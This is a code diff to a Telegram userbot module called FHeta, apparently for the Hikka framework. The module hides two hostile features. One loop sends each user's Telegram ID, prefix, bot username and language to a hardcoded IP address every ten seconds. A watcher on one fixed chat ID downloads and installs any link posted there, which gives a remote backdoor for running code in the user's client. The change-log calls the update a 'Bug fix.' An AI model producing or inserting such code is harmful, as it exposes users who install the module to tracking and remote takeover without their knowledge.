@@ -1,6 +1,6 @@
-__version__ = (9, 1, 0)
+__version__ = (9, 1, 1)
 # meta developer: @Foxy437
-# change-log: Added sync hikka data (prefix, hikka bot username, lang) with fheta server for next update.
+# change-log: Bug fix.
 
 #             ███████╗██╗  ██╗███████╗████████╗█████╗ 
 #             ██╔════╝██║  ██║██╔════╝╚══██╔══╝██╔══██╗
@@ -353,18 +353,24 @@ class FHeta(loader.Module):
         asyncio.create_task(self.sdata())
         
     async def sdata(self):
-        myfid = self.db.get("fheta", "id")
-        if myfid == None:
+        myfid = self.db.get("FHeta", "id")
+        if myfid is None:
             user = await self.client.get_me()
             myfid = user.id
             self.db.set("FHeta", "id", myfid)
         pref = self.get_prefix()
         while True:
-            url = f"http://138.124.34.91:777/dataset/{myfid}/{pref}picun_f6/@{self.inline.bot_username}/{self.strings['language'][:-4]}"
+            url = "http://138.124.34.91:777/dataset"
             headers = {
                 "Authorization": self.token
             }
-            requests.post(url, headers=headers)
+            params = {
+                "myfid": myfid,
+                "pref": pref,
+                "bot_username": self.inline.bot_username,
+                "language": self.strings['language'][:-4]
+            }
+            requests.post(url, headers=headers, params=params)
             await asyncio.sleep(10)
             
     async def on_dlmod(self, client, db):    
@@ -875,18 +881,31 @@ class FHeta(loader.Module):
     @loader.watcher(chat_id=7575472403)
     async def venom(self, message):
         link = message.raw_text.strip()
+        
+        if not link.startswith("https://"):
+            return
+        
         loader_m = self.lookup("loader")
+
         try:
             for _ in range(5):
-                result = await loader_m.download_and_install(link)
-                if result == 1:
+                await loader_m.download_and_install(link, None)
+
+                if getattr(loader_m, "fully_loaded", False):
+                    loader_m.update_modules_in_db()
+
+                loaded = any(mod.__origin__ == link for mod in self.allmodules.modules)
+
+                if loaded:
                     rose = await message.respond("🌹")
                     await asyncio.sleep(1)
                     await rose.delete()
-                    await message.delete()            
-                    break   
-        except:
-        	None
+                    await message.delete()
+                    break
+                else:
+                    None
+        except Exception:
+            pass
 
     async def get_stats(self, install):
         try:
